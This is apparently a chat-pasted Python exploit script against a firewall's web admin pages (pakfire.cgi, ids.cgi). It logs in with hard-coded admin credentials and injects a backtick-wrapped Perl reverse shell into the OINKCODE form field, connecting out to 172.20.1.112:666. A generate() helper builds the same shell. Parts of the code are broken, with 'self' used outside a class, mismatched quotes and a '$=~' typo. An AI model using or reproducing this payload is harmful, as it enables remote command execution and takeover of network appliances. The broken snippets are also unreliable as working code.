import requests

ip = '172.16.1.155'
user = 'admin'
password = '1pF1@dm#2020'
port = 444

r = requests.get(f'https://{ip}:{port}/cgi-bin/pakfire.cgi', auth=(user, password), verify=False)

def generate(self):
        return (
            "use IO;foreach my $key(keys %ENV){" +
            "if($ENV{$key}=~/(.)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"" +
            self.lhost +
            ":" +
            str(self.lport) +
            "");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.)/){system $1;}};"
        )

payload = "perl -MIO -e '" + generate()+"'" (edited)
[3:41 PM]
'OINKCODE':'{}'.format(payload)


r_exploit = requests.post(f'https://{ip}:{port}/cgi-bin/ids.cgi',auth=(user, password), verify=False,headers={'Referer':f'https://{ip}:{port}/cgi-bin/ids.cgi'}, data = {'ENABLE_SNORT_GREEN':'on','ENABLESNORT':'on','RULES':'registered','OINKCODE':'`perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"172.20.1.112:666");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($=~ /(.)/){system $1;}};'`','ACTION':'Download new ruleset','ACTION2':'snort'} )

#print(r.status_code)
print(r_exploit)